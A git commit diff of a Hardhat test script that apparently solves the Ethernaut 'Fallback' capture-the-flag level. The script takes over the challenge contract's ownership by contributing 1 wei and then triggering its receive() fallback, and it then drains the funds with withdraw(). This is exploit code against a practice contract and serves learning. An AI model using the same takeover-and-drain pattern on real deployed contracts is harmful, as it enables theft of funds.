117d45e3c33ae7db311f0d13723cb7d7da383c20
Sean Seefried <sean@seefried.com.au>
2022-03-20 17:09:09 +1000

    Update 1-fallback and revert utils.ts

--- test/1-fallback.ts
+++ test/1-fallback.ts
@@ -4,34 +4,48 @@ import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
 
 
-let s: ChallengeState | null = null;
+let accounts: Signer[];
+let eoa: Signer;
+let attacker: Contract;
+let challenge: Contract; // challenge contract
+let tx: any;
 
-before(getChallengeContract(s, `Fallback`, `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`));
+
+before(async () => {
+  accounts = await ethers.getSigners();
+  [eoa] = accounts;
+  const challengeFactory = await ethers.getContractFactory(`Fallback`);
+  const challengeAddress = await createChallenge(
+    `0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`
+  );
+  challenge = await challengeFactory.attach(challengeAddress);
+});
+
 
 it("solves the challenge", async function () {
-  let tx: any;
-  if (s == null) return;
-  console.log("my address: ", await s.eoa.getAddress());
-  console.log("original owner:", await s.challenge.owner());
+  let ourAddress: string = await eoa.getAddress();
+  console.log("Our address: ", ourAddress);
+  console.log("Original owner:", await challenge.owner());
 
-  tx = await s.challenge.contribute({
+  console.log("Call 'contribute' method");
+  tx = await challenge.contribute({
     value: ethers.utils.parseUnits(`1`, `wei`),
   });
   await tx.wait();
 
-  tx = await s.eoa.sendTransaction({
-    to: s.challenge.address,
+  console.log("sendTransaction so that receive() fallback method is called ");
+  tx = await eoa.sendTransaction({
+    to: challenge.address,
     value: ethers.utils.parseUnits(`1`, `wei`),
   });
   await tx.wait();
 
-  console.log("owner after sending ETH to contract: ", await s.challenge.owner());
+  console.log("Owner is our address: ", await challenge.owner() == ourAddress);
 
-  tx = await s.challenge.withdraw();
+  tx = await challenge.withdraw();
   await tx.wait();
 });
 
 after(async () => {
-  if (s == null) return;
-  expect(await submitLevel(s.challenge.address), "level not solved").to.be.true;
+  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
 });
